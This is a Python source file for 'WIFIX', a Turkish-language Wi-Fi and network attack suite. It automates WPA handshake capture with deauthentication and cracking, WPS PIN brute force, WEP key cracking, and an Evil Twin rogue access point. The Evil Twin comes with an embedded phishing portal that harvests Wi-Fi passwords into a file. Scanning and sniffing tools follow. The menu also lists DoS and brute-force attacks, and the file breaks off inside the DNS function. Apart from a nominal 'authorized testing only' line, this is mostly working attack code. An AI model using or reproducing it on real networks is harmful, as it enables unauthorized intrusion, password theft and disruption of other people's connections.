#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# ============================================================
#  WIFIX v4.0 - WiFi & Network Security Testing Suite
#  Developer : @markos39
#  Version   : 4.0  (23 Arac)
#  Test      : Kali / Parrot Linux, Python 3.9+
#  Not       : Root ile baslatmak ZORUNLU DEGIL; script
#              gerektiginde otomatik 'sudo' kullanir.
#  Kullanim  : Yalnizca YETKILI güvenlik testleri icindir.
# ============================================================

import os
import subprocess
import socket
import time
import re
import datetime
import platform
import threading
import shutil
import ipaddress
import random
import hashlib
import html
import urllib.request
import urllib.error
from concurrent.futures import ThreadPoolExecutor, as_completed

G = "\033[92m"; R = "\033[91m"; Y = "\033[93m"; C = "\033[96m"; B = "\033[1m"; X = "\033[0m"
VERSION, AUTHOR = "4.0", "@markos39"
REPORT_DIR = os.path.expanduser("~/Wifix_reports")
os.makedirs(REPORT_DIR, exist_ok=True)
LOG = []

# ============================================================
#  SABITLER
# ============================================================
SERVICE = {21:"FTP",22:"SSH",23:"Telnet",25:"SMTP",53:"DNS",80:"HTTP",110:"POP3",
           111:"RPC",135:"MS-RPC",139:"NetBIOS-SSN",143:"IMAP",161:"SNMP",389:"LDAP",
           443:"HTTPS",445:"SMB",465:"SMTPS",554:"RTSP",587:"SMTP-Sub",636:"LDAPS",
           873:"RSYNC",990:"FTPS",993:"IMAPS",995:"POP3S",1080:"SOCKS",1433:"MSSQL",
           1521:"Oracle",1723:"PPTP",2049:"NFS",2082:"cPanel",2083:"cPanel-SSL",
           2121:"FTP-Alt",2222:"SSH-Alt",2375:"Docker",3000:"Dev/Grafana",3128:"Squid",
           3306:"MySQL",3389:"RDP",4443:"HTTPS-Alt",5000:"UPnP/Dev",5060:"SIP",
           5222:"XMPP",5432:"PostgreSQL",5555:"ADB",5601:"Kibana",5666:"NRPE",
           5800:"VNC-HTTP",5900:"VNC",5984:"CouchDB",6379:"Redis",6443:"K8s-API",
           6667:"IRC",7001:"WebLogic",8080:"HTTP-Alt",8081:"HTTP-Alt2",8088:"HTTP-Alt3",
           8443:"HTTPS-Alt",8500:"Consul",8888:"HTTP-Alt4",9000:"PHP-FPM/Dev",
           9042:"Cassandra",9090:"WebUI",9092:"Kafka",9100:"JetDirect",9200:"Elasticsearch",
           9300:"ES-Transport",9999:"Dev",10000:"Webmin",11211:"Memcached",
           15672:"RabbitMQ-Mgmt",27017:"MongoDB",28017:"MongoDB-HTTP",50000:"SAP",
           50070:"HDFS"}

TOP100 = [21,22,23,25,53,80,110,111,135,139,143,161,162,179,389,443,445,465,514,
          515,554,587,636,873,990,993,995,1025,1080,1099,1234,1433,1521,1723,1900,
          2049,2082,2083,2121,2222,2375,3000,3128,3268,3306,3389,3690,4443,5000,
          5001,5060,5222,5432,5555,5601,5666,5800,5900,5984,6000,6001,6379,6443,
          6667,7001,7070,7443,8000,8008,8009,8080,8081,8088,8090,8181,8222,8333,
          8443,8500,8600,8888,9000,9001,9042,9090,9092,9100,9200,9300,9443,9999,
          10000,10001,11211,15672,27017,28017,50000,50070]

SMALL_SUBS = ["www","mail","ftp","localhost","webmail","smtp","pop","ns1","webdisk",
              "ns2","cpanel","whm","autodiscover","autoconfig","m","imap","test","ns",
              "blog","pop3","dev","www2","admin","forum","news","vpn","ns3","mail2",
              "new","mysql","old","lists","support","mobile","mx","static","docs",
              "beta","shop","sql","secure","demo","cp","calendar","wiki","web","media",
              "email","images","img","www1","intranet","portal","video","sip","dns2",
              "api","cdn","staging","test2","site","search","update","help","ws",
              "gateway","remote","dns","api2","apps","cloud","status","uat","beta2"]

SMALL_DIRS = ["admin","login","wp-admin","wp-content","wp-includes","backup","bak",
              "old","test","api","v1","v2","config","db","sql","phpmyadmin",
              "robots.txt","sitemap.xml",".git/HEAD",".env","server-status","uploads",
              "images","css","js","include","includes","private","secret","tmp","temp",
              "data","files","download","downloads","doc","docs","README","LICENSE",
              "index.php","index.html","default","htaccess",".htaccess","web.config",
              "xmlrpc.php","wp-login.php","user","users","register","signup","console",
              "panel","cgi-bin","shell","cmd","upload","filemanager","manager","cron",
              "status","health","metrics","debug","trace","swagger","api-docs","graphql",
              "oauth","token","keys","certs","logs","log","error","errors","404","403",
              "500","server","static","assets","content","media","fonts","themes",
              "plugins","modules","vendor","lib","libs","src","dist","build","cache",
              "sessions","mail","queue","jobs","worker","backups","archive","dev",
              "prod","staging","test2","admin2","administrator","support","helpdesk",
              "portal","cms","blog","forum","shop","store","cart","checkout","payment",
              "billing","account","profile","settings","preferences"]

FINGERPRINTS = [("wp-content", "WordPress"), ("wp-includes", "WordPress"),
                ("phpsessid", "PHP"), ("jsessionid", "Java/JSP"),
                ("aspsessionid", "ASP.NET"), ("nginx", "Nginx"), ("apache", "Apache"),
                ("cloudflare", "Cloudflare"), ("drupal", "Drupal"), ("joomla", "Joomla"),
                ("shopify", "Shopify"), ("bootstrap", "Bootstrap"), ("jquery", "jQuery"),
                ("react", "React"), ("vue", "Vue.js"), ("angular", "Angular"),
                ("x-generator", "CMS Generator"), ("gitlab", "GitLab"),
                ("jenkins", "Jenkins"), ("cpanel", "cPanel"), ("plesk", "Plesk"),
                ("express", "Express.js"), ("django", "Django"), ("flask", "Flask"),
                ("rails", "Ruby on Rails"), ("laravel", "Laravel"), ("symfony", "Symfony")]

# ============================================================
#  YARDIMCI FONKSIYONLAR
# ============================================================
def log(msg):
    LOG.append(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] {msg}")

def run(cmd, t=120):
    try:
        p = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=t)
        return p.returncode, (p.stdout or "") + (p.stderr or "")
    except subprocess.TimeoutExpired:
        return 1, "TIMEOUT"
    except Exception as e:
        return 1, str(e)

def srun(cmd, t=120):
    """Root gerektiren komut: gerekirse sudo ekler."""
    c = cmd if need_root() else "sudo " + cmd
    return run(c, t)

def need_root():
    return os.geteuid() == 0

def have(b):
    return shutil.which(b) is not None

def ts():
    return datetime.datetime.now().strftime("%Y%m%d_%H%M%S")

def clean(s):
    """Shell/filename icin guvenli hale getirir."""
    return re.sub(r"[^A-Za-z0-9._-]", "_", str(s).strip())

def valid_bssid(s):
    return bool(re.fullmatch(r"([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}", s.strip()))

def valid_ip(s):
    try:
        ipaddress.ip_address(s.strip()); return True
    except Exception:
        return False

def valid_host(s):
    return bool(re.fullmatch(r"[A-Za-z0-9._-]+", s.strip()))

def getmac(iface):
    try:
        return open(f"/sys/class/net/{iface}/address").read().strip()
    except Exception:
        return "00:00:00:00:00:00"

def restore_net():
    print(Y + "[*] Ag servisleri geri yukleniyor..." + X)
    run("sudo systemctl restart NetworkManager 2>/dev/null || sudo service NetworkManager restart 2>/dev/null || sudo service network-manager restart 2>/dev/null", 30)

def local_net():
    rc, out = run("ip -4 -o addr show scope global 2>/dev/null", 10)
    for l in out.splitlines():
        m = re.search(r"inet (\d+\.\d+\.\d+\.\d+/\d+)", l)
        if m: return m.group(1)
    return None

def pick_iface():
    rc, out = run("iw dev 2>/dev/null | grep Interface", 10)
    ifaces = []
    for l in out.splitlines():
        n = l.split()[-1].strip()
        if (n and not n.endswith("mon") and os.path.exists(f"/sys/class/net/{n}")
                and not n.startswith(("lo", "docker", "veth", "br-", "virbr"))):
            ifaces.append(n)
    if not ifaces:
        rc, out = run("iwconfig 2>/dev/null | grep -oP '^\\S+'", 10)
        ifaces = [l.strip() for l in out.splitlines()
                  if l.strip() and not l.strip().endswith("mon")]
    if not ifaces:
        print(R + "[-] Kablosuz arayuz bulunamadi (iw/iwconfig kurulu olmali)." + X)
        return None
    print(C + "[i] Kablosuz arayuzler:" + X)
    for i, f in enumerate(ifaces, 1):
        print(f"     [{i}] {f}")
    try:
        return ifaces[int(input("  Secim: ").strip()) - 1]
    except Exception:
        return ifaces[0]

def monitor_start(iface):
    mon = iface.rstrip("mon") + "mon"
    if not need_root():
        print(Y + "[!] Monitor modu root ister; sudo ile devam ediliyor." + X)
    srun("airmon-ng check kill", 30)
    srun(f"airmon-ng start {iface}", 30)
    time.sleep(3)
    if not os.path.exists(f"/sys/class/net/{mon}"):
        rc, out = run("iw dev 2>/dev/null | grep Interface", 10)
        for l in out.splitlines():
            n = l.split()[-1].strip()
            if n and n != iface and os.path.exists(f"/sys/class/net/{n}"):
                mon = n; break
    if os.path.exists(f"/sys/class/net/{mon}"):
        print(G + f"[+] Monitor arayuz: {mon}" + X)
    else:
        print(R + f"[-] Monitor arayuz olusturulamadi ({mon})." + X)
    return mon

def monitor_stop(mon):
    srun(f"airmon-ng stop {mon}", 30)
    time.sleep(2)
    restore_net()

def ping_sweep(cidr):
    net = ipaddress.ip_network(cidr, strict=False)
    hosts = [str(h) for h in net.hosts()]
    alive = []
    print(C + f"[*] {len(hosts)} host taranıyor (ping sweep)..." + X)
    with ThreadPoolExecutor(max_workers=60) as ex:
        futs = {ex.submit(run, f"ping -c 1 -W 1 {h}", 5): h for h in hosts}
        for f in as_completed(futs):
            h = futs[f]
            if f.result()[0] == 0:
                alive.append(h)
                print(f"  {G}[+]{X} {h} yasiyor")
    return sorted(alive)

def get_arp_table():
    rc, out = srun("cat /proc/net/arp", 10)
    tbl = {}
    for l in out.splitlines()[1:]:
        p = l.split()
        if len(p) >= 4 and p[2] == "0x2":
            tbl[p[0]] = p[3]
    return tbl

def scan_port(ip, port, timeout=1.0):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        r = s.connect_ex((ip, port))
        s.close()
        return r == 0
    except Exception:
        return False

def save_report(text, tag="rapor"):
    fn = f"Wifix_{tag}_{ts()}.txt"
    path = os.path.join(REPORT_DIR, fn)
    with open(path, "w", encoding="utf-8") as f:
        f.write(text + "\n")
    hp = path.replace(".txt", ".html")
    with open(hp, "w", encoding="utf-8") as f:
        f.write("<html><head><meta charset='utf-8'><title>Wifix Rapor</title></head>"
                "<body style='background:#0a0a0a;color:#00ff88;font-family:monospace'>"
                "<pre>" + html.escape(text) + "</pre></body></html>")
    print(G + f"[+] Rapor kaydedildi: {path}" + X)
    log(f"Rapor kaydedildi: {path}")
    return path

def check_deps():
    tools = ["airodump-ng", "aireplay-ng", "aircrack-ng", "reaver", "wash", "hostapd",
             "dnsmasq", "tcpdump", "arp-scan", "dig", "traceroute", "hydra", "john",
             "macchanger", "nmap"]
    missing = [t for t in tools if not have(t)]
    print(C + "[i] Bagimlilik kontrolu:" + X)
    for t in tools:
        st = G + "[+]" + X if have(t) else R + "[-]" + X
        print(f"     {st} {t}")
    if missing:
        print(Y + "  [!] Eksikler: " + ", ".join(missing) + X)
        print(Y + "  [!] Kurulum: sudo apt install " + " ".join(missing) + X)
    print()

# ============================================================
#  BANNER & MENU
# ============================================================
def banner():
    os.system("clear")
    art = G + B + r"""
██╗    ██╗██╗███████╗██╗██╗  ██╗
██║    ██║██║██╔════╝██║╚██╗██╔╝
██║ █╗ ██║██║█████╗  ██║ ╚███╔╝
██║███╗██║██║██╔══╝  ██║ ██╔██╗
╚███╔███╔╝██║██║     ██║██╔╝ ██╗
 ╚══╝╚══╝ ╚═╝╚═╝     ╚═╝╚═╝  ╚═╝
""" + X
    print(art)
    print(G + B + "   Wifix v" + VERSION + " - Yetkili Pentest & Siber Guvenlik Suiti" + X)
    print(f"{G}╔══════════════════════════════════════════════════════════╗{X}")
    print(f"{G}║  Yapimci: {AUTHOR}  |  23 Arac  |  Kali/Parrot         ║{X}")
    print(f"{G}╚══════════════════════════════════════════════════════════╝{X}")
    print(f"{C}  [i] Root GEREKTIRMEZ - gerekli islemler otomatik sudo ile yapilir{X}")
    print(f"{Y}  [!] Yalnizca yetkili guvenlik testleri icin kullanin.{X}\n")

def menu():
    print(f"""
{G} === HACK ARACLARI ==={X}
{C}[1]  WPA/WPA2 Saldiri (Handshake){X}
{C}[2]  WPS Saldiri (PIN Brute Force){X}
{C}[3]  WEP Saldiri (IV Toplama){X}
{C}[4]  Ikiz Seytan Saldirisi (Evil Twin + Deauth){X}

{G} === SIBER GUVENLIK ARACLARI ==={X}
{C}[5]  Port Tarama{X}
{C}[6]  Ag Trafigi Dinleme & Analiz{X}
{C}[7]  IP/Cihaz Tarama & Kesif{X}
{C}[8]  ARP Spoofing Tespiti & MITM Analizi{X}
{C}[9]  Ag Haritalama & Topoloji Cikarma{X}
{C}[10] Guvenlik Raporlama & Log Analizi{X}

{G} === GELISMIS ARACLAR ==={X}
{C}[11] DoS Saldirisi (SYN / Ping Flood){X}
{C}[12] Deauth Saldirisi (Wi-Fi Kick){X}
{C}[13] Subdomain Kesfi{X}
{C}[14] Dizin Fuzzing{X}
{C}[15] SSH / FTP Brute Force{X}
{C}[16] Hash Kirma (Wordlist){X}
{C}[17] DNS Kesif & Zone Transfer{X}
{C}[18] OS Parmak Izi (TTL Analizi){X}
{C}[19] Traceroute & Rota Analizi{X}
{C}[20] Web Teknoloji Tespiti{X}

{G} === YARDIMCI ARACLAR ==={X}
{Y}[W]  Wi-Fi Ag Tarama{X}
{Y}[M]  MAC Adresi Degistir{X}
{Y}[R]  Rapor Kaydet{X}
{R}[Q]  Cikis{X}
""")

# ============================================================
#  [1] WPA/WPA2 HANDSHAKE SALDIRISI
# ============================================================
def tool1():
    log("WPA/WPA2 handshake saldirisi baslatildi")
    if not (have("airodump-ng") and have("aireplay-ng") and have("aircrack-ng")):
        print(Y + "[!] aircrack-ng eksik: sudo apt install aircrack-ng" + X)
    iface = pick_iface()
    if not iface: return
    mon = monitor_start(iface)
    print(C + "[*] 20 sn ag taramasi (airodump-ng)..." + X)
    rc, out = srun(f"timeout 20 airodump-ng {mon} --band abg -w /tmp/wifix_scan --write-interval 5", 30)
    if rc != 0:
        srun(f"timeout 20 airodump-ng {mon} -w /tmp/wifix_scan --write-interval 5", 30)
    bssid = input(C + "  Hedef BSSID: " + X).strip()
    if not valid_bssid(bssid):
        print(R + "[-] Gecersiz BSSID." + X); monitor_stop(mon); return
    ch = input(C + "  Hedef Kanal: " + X).strip()
    essid = clean(input(C + "  ESSID (ops.): " + X).strip()) or "hedef"
    pre = f"/tmp/wifix_{essid}"
    print(C + "[*] Handshake dinleniyor + deauth gonderiliyor (45 sn)..." + X)
    threading.Thread(target=lambda: run(
        f"sudo timeout 45 airodump-ng {mon} -c {ch} --bssid {bssid} -w {pre} --output-format cap", 55),
        daemon=True).start()
    time.sleep(8)
    srun(f"aireplay-ng -0 5 -a {bssid} {mon}", 25)
    time.sleep(6)
    srun(f"aireplay-ng -0 5 -a {bssid} {mon}", 25)
    time.sleep(28)
    cap = pre + "-01.cap"
    if os.path.exists(cap):
        print(G + f"[+] Handshake yakalandi: {cap}" + X)
        wl = input(C + "  Wordlist (Enter = rockyou.txt): " + X).strip() or "/usr/share/wordlists/rockyou.txt"
        if not os.path.exists(wl):
            print(Y + f"[!] Wordlist yok: {wl}" + X)
            wl = input(C + "  Gecerli bir wordlist yolu: " + X).strip()
        if os.path.exists(wl):
            print(C + "[*] aircrack-ng ile kirma deneniyor..." + X)
            srun(f"aircrack-ng -w {wl} {cap} -b {bssid}", 300)
        else:
            print(R + "[-] Wordlist bulunamadi." + X)
    else:
        print(R + "[-] Handshake yakalanamadi. Aircrack-ng kurulu mu? (sudo apt install aircrack-ng)" + X)
    monitor_stop(mon)

# ============================================================
#  [2] WPS PIN BRUTE FORCE
# ============================================================
def tool2():
    log("WPS saldirisi baslatildi")
    iface = pick_iface()
    if not iface: return
    mon = monitor_start(iface)
    if have("wash"):
        print(C + "[*] WPS aglari taranıyor (wash, 20 sn)..." + X)
        srun("timeout 20 wash -i " + mon, 30)
    else:
        print(Y + "[!] wash yok, BSSID elle girilecek: sudo apt install reaver" + X)
    bssid = input(C + "  BSSID: " + X).strip()
    if not valid_bssid(bssid):
        print(R + "[-] Gecersiz BSSID." + X); monitor_stop(mon); return
    ch = input(C + "  Kanal: " + X).strip()
    pin = input(C + "  PIN (bos = kaba kuvvet): " + X).strip()
    if not have("reaver"):
        print(R + "[-] reaver gerekli: sudo apt install reaver" + X)
        monitor_stop(mon); return
    print(C + "[*] reaver baslatiliyor (5 dk zaman asimi)..." + X)
    args = f"-i {mon} -b {bssid} -c {ch} -vv -K 1 -N"
    if pin: args += f" -p {pin}"
    srun(f"timeout 300 reaver {args}", 320)
    monitor_stop(mon)

# ============================================================
#  [3] WEP SALDIRISI (IV TOPLAMA)
# ============================================================
def tool3():
    log("WEP saldirisi baslatildi")
    iface = pick_iface()
    if not iface: return
    mon = monitor_start(iface)
    print(C + "[*] WEP aglari taranıyor (20 sn)..." + X)
    srun("timeout 20 airodump-ng " + mon + " --encrypt WEP -w /tmp/wifix_wep", 30)
    bssid = input(C + "  BSSID: " + X).strip()
    if not valid_bssid(bssid):
        print(R + "[-] Gecersiz BSSID." + X); monitor_stop(mon); return
    ch = input(C + "  Kanal: " + X).strip()
    essid = clean(input(C + "  ESSID (ops.): " + X).strip()) or "wep_hedef"
    pre = f"/tmp/wifix_{essid}"
    print(C + "[*] IV toplama + ARP replay baslatildi (2 dk)..." + X)
    threading.Thread(target=lambda: run(
        f"sudo timeout 160 airodump-ng {mon} -c {ch} --bssid {bssid} -w {pre}", 170),
        daemon=True).start()
    time.sleep(8)
    mac = getmac(mon)
    srun(f"aireplay-ng -1 0 -a {bssid} -h {mac} {mon}", 20)   # fake auth
    time.sleep(3)
    srun(f"aireplay-ng -3 -b {bssid} -h {mac} {mon}", 140)    # arp replay
    time.sleep(25)
    cap = pre + "-01.cap"
    print(C + "[*] aircrack-ng ile WEP anahtari kiriliyor..." + X)
    if os.path.exists(cap):
        srun(f"aircrack-ng {cap} -b {bssid}", 120)
    else:
        print(R + "[-] Capture dosyasi yok, yeterli IV toplanamadi." + X)
    monitor_stop(mon)

# ============================================================
#  [4] EVIL TWIN + DEAUTH (sahte portal)
# ============================================================
PORTAL_CODE = '''import http.server, re, time, urllib.parse
LOG = "__LOG__"
class H(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200); self.send_header("Content-Type","text/html; charset=utf-8"); self.end_headers()
        html = "<html><head><title>Wi-Fi Guncelleme</title></head><body style='font-family:sans-serif;text-align:center;margin-top:60px'><h2>Wi-Fi Agi Guncellendi</h2><p>Lutfen sifrenizi girerek baglantiyi yenileyin</p><form method='POST'><input type='password' name='pwd' placeholder='Ag Sifresi'><br><br><button type='submit'>Baglan</button></form></body></html>"
        self.wfile.write(html.encode())
    def do_POST(self):
        l = int(self.headers.get("Content-Length",0)); data = self.rfile.read(l).decode()
        m = re.search(r"pwd=([^&]+)", data)
        p = urllib.parse.unquote(m.group(1)) if m else "?"
        with open(LOG,"a") as f: f.write(time.strftime("%H:%M:%S") + " | " + p + "\\n")
        self.send_response(200); self.send_header("Content-Type","text/html"); self.end_headers()
        self.wfile.write(b"<html><body><center><h3>Hata! Tekrar deneyin...</h3><meta http-equiv='refresh' content='2;url=/'>")
    def log_message(self, *a): pass
http.server.HTTPServer(("0.0.0.0",80),H).serve_forever()
'''

def tool4():
    log("Evil Twin saldirisi baslatildi")
    if not (have("hostapd") and have("dnsmasq")):
        print(Y + "[!] hostapd/dnsmasq eksik: sudo apt install hostapd dnsmasq" + X)
    iface = pick_iface()
    if not iface: return
    bssid = input(C + "  Hedef BSSID: " + X).strip()
    if not valid_bssid(bssid):
        print(R + "[-] Gecersiz BSSID." + X); return
    ch = input(C + "  Hedef Kanal: " + X).strip()
    essid = clean(input(C + "  Klonlanacak SSID: " + X).strip())
    if not essid:
        print(R + "[-] SSID bos olamaz." + X); return
    d = "/tmp/wifix_evil"; os.makedirs(d, exist_ok=True)
    open(f"{d}/hostapd.conf", "w").write(
        f"interface={iface}\ndriver=nl80211\nssid={essid}\nhw_mode=g\nchannel={ch}\n")
    open(f"{d}/dnsmasq.conf", "w").write(
        f"interface={iface}\ndhcp-range=192.168.1.100,192.168.1.200,12h\n"
        f"dhcp-option=3,192.168.1.1\ndhcp-option=6,192.168.1.1\naddress=/#/192.168.1.1\n")
    open(f"{d}/portal.py", "w").write(PORTAL_CODE.replace("__LOG__", d + "/creds.txt"))
    try:
        srun(f"ifconfig {iface} 192.168.1.1 netmask 255.255.255.0 up", 15)
        time.sleep(1)
        print(C + "[*] hostapd baslatiliyor..." + X)
        threading.Thread(target=lambda: run(f"sudo hostapd {d}/hostapd.conf", 3600), daemon=True).start()
        time.sleep(4)
        threading.Thread(target=lambda: run(f"sudo dnsmasq -C {d}/dnsmasq.conf --no-daemon", 3600), daemon=True).start()
        threading.Thread(target=lambda: run(f"sudo python3 {d}/portal.py", 3600), daemon=True).start()
        time.sleep(2)
        mon = None
        rc, out = run("iw dev 2>/dev/null | grep Interface", 10)
        for l in out.splitlines():
            n = l.split()[-1].strip()
            if n.endswith("mon") and os.path.exists(f"/sys/class/net/{n}"):
                mon = n; break
        if mon:
            print(C + "[*] Hedefe deauth gonderiliyor (10 sn)..." + X)
            srun(f"aireplay-ng -0 10 -a {bssid} {mon}", 30)
        else:
            print(Y + "[!] Monitor arayuz yok; deauth atlandi (2 kartli kurulum onerilir)." + X)
        print(G + f"[+] Evil Twin AKTIF! Sifreler {d}/creds.txt dosyasina yazilir." + X)
        input(C + "  Durdurmak icin Enter'a bas..." + X)
    finally:
        run("sudo pkill hostapd; sudo pkill dnsmasq; sudo pkill -f portal.py", 15)
        run(f"sudo ip link set {iface} down; sudo ip addr flush dev {iface}; sudo ip link set {iface} up", 15)
        restore_net()

# ============================================================
#  [5] PORT TARAMA
# ============================================================
def tool5():
    log("Port tarama baslatildi")
    target = input(C + "  Hedef IP/Domain: " + X).strip()
    if not target:
        print(R + "[-] Hedef bos olamaz." + X); return
    try:
        ip = socket.gethostbyname(target)
    except Exception:
        print(R + "[-] Hedef cozumlenemedi." + X); return
    print(C + f"[*] Hedef: {target} ({ip})" + X)
    mode = input(C + "  Mod (hizli=100 port / tam=1000 port / ozel): " + X).strip().lower() or "hizli"
    if mode.startswith("h"):
        ports = TOP100
    elif mode.startswith("t"):
        ports = list(range(1, 1001))
    elif mode.startswith("o"):
        try:
            ports = [int(p) for p in input("  Portlar (virgulle): ").split(",") if p.strip().isdigit()]
            if not ports: raise ValueError
        except Exception:
            print(R + "[-] Gecersiz port listesi." + X); return
    else:
        ports = TOP100
    open_ports = []
    print(C + f"[*] {len(ports)} port taranıyor..." + X)
    with ThreadPoolExecutor(max_workers=150) as ex:
        futs = {ex.submit(scan_port, ip, p): p for p in ports}
        for f in as_completed(futs):
            p = futs[f]
            if f.result():
                svc = SERVICE.get(p, "?")
                open_ports.append((p, svc))
                print(f"  {G}[+]{X} {p}/tcp  {svc}")
    open_ports.sort()
    # Servis tespiti (banner)
    print(C + "[*] Banner/servis tespiti..." + X)
    results = []
    for p, svc in open_ports[:30]:
        try:
            s = socket.socket(); s.settimeout(4)
            s.connect((ip, p))
            s.send(b"\r\n")
            time.sleep(0.5)
            try: banner_data = s.recv(200).decode(errors="replace").strip()
            except Exception: banner_data = ""
            s.close()
            results.append(f"{p}/tcp | {svc} | {banner_data}")
        except Exception:
            results.append(f"{p}/tcp | {svc} | (banner yok)")
    for r in results:
        print(f"  {C}[i]{X} {r}")
    out = f"WIFIX Port Tarama\nHedef: {target} ({ip}) | Tarih: {ts()}\n"
    out += f"Açık port sayisi: {len(open_ports)}\n\n" + "\n".join(results)
    save_report(out, "port_tarama")

# ============================================================
#  [6] AG TRAFIGI DINLEME & ANALIZ
# ============================================================
def tool6():
    log("Trafik dinleme baslatildi")
    iface = pick_iface()
    if not iface: return
    if not have("tcpdump"):
        print(Y + "[!] tcpdump yok: sudo apt install tcpdump" + X)
    cnt = input(C + "  Kac paket yakalansin (Enter=50): " + X).strip() or "50"
    try: cnt = int(cnt)
    except Exception: cnt = 50
    cap = "/tmp/wifix_capture.pcap"
    print(C + f"[*] {cnt} paket dinleniyor (tcpdump)..." + X)
    rc, out = srun(f"timeout 60 tcpdump -i {iface} -c {cnt} -w {cap} -nn", 70)
    if rc == 0 or os.path.exists(cap):
        print(G + f"[+] Yakalandi: {cap}" + X)
        print(C + "[*] Paket ozetleri..." + X)
        srun(f"tcpdump -r {cap} -nn -c {cnt} 2>/dev/null | head -60", 30)
        print(C + "[*] Protokol dagilimi..." + X)
        srun(f"capinfos {cap} 2>/dev/null | head -20", 20)
        srun(f"tcpdump -r {cap} -nn 2>/dev/null | awk '{{print $2}}' | sort | uniq -c | sort -rn | head -10", 20)
        out = f"WIFIX Trafik Analiz\nArayuz: {iface} | Paket: {cnt} | Tarih: {ts()}\n\n"
        out += "tcpdump ozeti:\n" + out.strip() if False else ""
        save_report(f"WIFIX Trafik Analiz\nArayuz: {iface} | Paket: {cnt}\nDosya: {cap}", "trafik")
    else:
        print(R + "[-] Yakalama basarisiz (root/arayuz kontrol et)." + X)

# ============================================================
#  [7] IP/CIHAZ TARAMA & KESIF
# ============================================================
def tool7():
    log("Cihaz kesfi baslatildi")
    net = input(C + "  Ag (Enter = otomatik tespit): " + X).strip()
    if not net:
        net = local_net()
        if not net:
            print(R + "[-] Ag tespit edilemedi, CIDR girin." + X); return
        print(C + f"[i] Tespit edilen ag: {net}" + X)
    try:
        ipaddress.ip_network(net, strict=False)
    except Exception:
        print(R + "[-] Gecersiz CIDR." + X); return
    alive = ping_sweep(net)
    print(C + "[*] ARP tablosu ile MAC esleme..." + X)
    arp = get_arp_table()
    vendor = {}
    rc, out = run("cat /usr/share/ieee-data/oui.txt 2>/dev/null | grep -iE '^[0-9A-F]{6}' | head -0", 5)
    for ip in alive:
        mac = arp.get(ip, "?")
        if mac != "?" and mac != "00:00:00:00:00:00":
            oui = mac[:8].upper().replace(":", "")
            if oui in vendor: v = vendor[oui]
            else: v = "?"
            print(f"  {G}[+]{X} {ip}  MAC: {mac}")
        else:
            print(f"  {G}[+]{X} {ip}  MAC: (ARP'de yok)")
    save_report(f"WIFIX Cihaz Kesfi\nAg: {net}\nYasiyan hostlar:\n" +
                "\n".join(f"{ip} | {arp.get(ip, '?')}" for ip in alive), "cihaz_kesfi")

# ============================================================
#  [8] ARP SPOOFING TESPITI & MITM ANALIZI
# ============================================================
def tool8():
    log("ARP spoof tespiti baslatildi")
    gw = input(C + "  Gateway IP (Enter = otomatik): " + X).strip()
    if not gw:
        rc, out = run("ip route | grep default", 5)
        m = re.search(r"default via (\S+)", out)
        gw = m.group(1) if m else ""
    if not valid_ip(gw):
        print(R + "[-] Gecersiz gateway." + X); return
    iface = pick_iface() or "eth0"
    print(C + f"[*] Gateway {gw} MAC'i aliniyor..." + X)
    time.sleep(1)
    arp = get_arp_table()
    gwmac = arp.get(gw)
    if not gwmac:
        srun(f"ping -c 2 {gw}", 5)
        arp = get_arp_table()
        gwmac = arp.get(gw)
    if not gwmac:
        print(R + "[-] Gateway MAC bulunamadi." + X); return
    print(G + f"[+] Gateway: {gw} -> {gwmac}" + X)
    print(Y + "[!] 15 sn boyunca ARP tablosu izleniyor (spoof degisimi araniyor)..." + X)
    baselines = {}
    for _ in range(15):
        tbl = get_arp_table()
        for ip, mac in tbl.items():
            if ip == gw: continue
            if ip in baselines and baselines[ip] != mac and mac != "00:00:00:00:00:00":
                print(R + f"[!] SÜPHELI: {ip} MAC degisti {baselines[ip]} -> {mac} (ARP spoof?!)" + X)
                log(f"ARP spoof suphesi: {ip} {baselines[ip]} -> {mac}")
            else:
                baselines[ip] = mac
        time.sleep(1)
    print(G + "[*] 15 sn izleme tamam." + X)
    print(C + "[i] Gateway ile eslesmeyen cift kayitlar (MITM koku):" + X)
    for ip, mac in baselines.items():
        if mac != gwmac:
            print(f"  {C}[i]{X} {ip} -> {mac}")
    save_report(f"WIFIX ARP Spoof Tespiti\nGateway: {gw} ({gwmac})\n\n" +
                "\n".join(f"{ip} -> {mac}" for ip, mac in baselines.items()), "arp_tespit")

# ============================================================
#  [9] AG HARITALAMA & TOPOLOJI
# ============================================================
def tool9():
    log("Ag haritalama baslatildi")
    net = input(C + "  Ag (Enter = otomatik): " + X).strip() or local_net() or ""
    if not net:
        print(R + "[-] Ag bulunamadi." + X); return
    try:
        ipaddress.ip_network(net, strict=False)
    except Exception:
        print(R + "[-] Gecersiz CIDR." + X); return
    alive = ping_sweep(net)
    arp = get_arp_table()
    print(G + "╔══════════════════════════════════════════════════╗" + X)
    print(G + "║              WIFIX AG TOPOLOJISI                ║" + X)
    print(G + "╠══════════════════════════════════════════════════╣" + X)
    print(G + "║  GATEWAY/DEFAULT ROTA                           ║" + X)
    rc, out = run("ip route | grep default", 5)
    print("║  " + (out.strip() or "-")[:42].ljust(42) + "║")
    print(G + "╠══════════════════════════════════════════════════╣" + X)
    print(G + "║  BULUNAN CIHAZLAR (" + str(len(alive)) + ")                       ║" + X)
    for ip in alive:
        mac = arp.get(ip, "?")
        print("║  " + f"{ip}  [{mac}]".ljust(42) + "║")
    print(G + "╚══════════════════════════════════════════════════╝" + X)
    if have("nmap"):
        print(C + "[*] nmap ile servis kesfi (hizli)..." + X)
        srun(f"nmap -sn {net} 2>/dev/null | grep -E 'Nmap scan|MAC' | head -40", 120)
    save_report(f"WIFIX Ag Haritasi\nAg: {net}\n\n" +
                "\n".join(f"{ip} | {arp.get(ip, '?')}" for ip in alive), "ag_haritasi")
    # ============================================================
#  [17] DNS KESIF & ZONE TRANSFER
# ============================================================
def tool17():
    log("DNS kesfi baslatildi")
    dom = input(C + "  Domain (orn. ornek.com): " + X).strip().lower()
    if not valid_host(dom) or "." not in dom:
        print(R + "[-] Gecersiz domain." + X); return
    print(C + "[*] DNS kayitlari sorgulaniyor..." + X)
    for tip in ("A", "AAAA", "MX", "NS", "TXT", "SOA", "CNAME"):
        rc, out = run(f"dig +short {dom} {tip} 2>/dev/null", 15)
        if out.strip():
